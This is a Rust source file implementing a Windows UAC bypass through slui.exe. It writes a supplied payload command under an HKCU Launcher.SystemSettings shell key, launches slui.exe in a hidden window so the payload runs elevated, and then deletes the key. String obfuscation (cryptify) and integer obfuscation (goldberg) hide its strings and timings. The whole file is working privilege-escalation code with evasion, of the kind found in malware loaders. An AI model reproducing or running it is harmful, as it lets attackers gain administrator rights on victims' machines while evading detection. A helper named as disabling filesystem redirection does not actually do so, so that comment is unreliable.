use winreg::enums;
use std::process::{Command, Stdio};
use std::thread;
use std::time::Duration;

#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

#[cfg(target_os = "windows")]
use winreg::RegKey;

#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;

/// Create/modify a registry value under HKCU
#[cfg(target_os = "windows")]
pub fn set_hkcu_value(
    path: &str,
    name: Option<&str>,
    value: Option<&str>,
    create: bool,
) -> std::io::Result<()> {
    let hkcu = RegKey::predef(winreg::enums::HKEY_CURRENT_USER);

    let key = if create {
        hkcu.create_subkey(path)?.0
    } else {
        hkcu.open_subkey_with_flags(path, enums::KEY_SET_VALUE)?
    };

    match (name, value) {
        (Some(n), Some(v)) => key.set_value(n, &v)?,
        (None, Some(v)) => key.set_value(cryptify::encrypt_string!(""), &v)?,
        (Some(n), None) => key.set_value(n, &cryptify::encrypt_string!(""))?,
        (None, None) => key.set_value(cryptify::encrypt_string!(""), &cryptify::encrypt_string!(""))?,
    }

    Ok(())
}

/// Delete registry key
pub fn delete_hkcu_key(path: &str) -> std::io::Result<()> {
    let hkcu = RegKey::predef(winreg::enums::HKEY_CURRENT_USER);
    let _ = hkcu.delete_subkey_all(path);
    Ok(())
}

/// Launch a program with WOW64 FS redirection disabled
#[cfg(target_os = "windows")]
pub fn launch_with_fsr_disabled(program: &str) -> std::io::Result<()> {
    Command::new(program)
        .creation_flags(CREATE_NO_WINDOW)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()?;
    Ok(())
}

/// UAC bypass via slui
pub fn uac_slui(payload: &String) {
    let path = cryptify::encrypt_string!("Software\\Classes\\Launcher.SystemSettings\\shell\\open\\command");

    let _ = delete_hkcu_key(&path);

    if let Err(_) = set_hkcu_value(&path, None, Some(payload), true) {
        let _ = delete_hkcu_key(&path);
        return;
    }

    if let Err(_) = set_hkcu_value(&path, Some(&cryptify::encrypt_string!("DelegateExecute")), None, true) {
        let _ = delete_hkcu_key(&path);
        return;
    }

    thread::sleep(Duration::from_secs(goldberg::goldberg_int!(3)));

    let slui_path = cryptify::encrypt_string!("C:\\Windows\\System32\\slui.exe");

    if let Err(_) = launch_with_fsr_disabled(&slui_path) {
        let _ = delete_hkcu_key(&path);
        return;
    }

    let cleanup_path = path.to_string();
    thread::spawn(move || {
        thread::sleep(Duration::from_secs(goldberg::goldberg_int!(5)));
        let _ = delete_hkcu_key(&cleanup_path);
    });
}
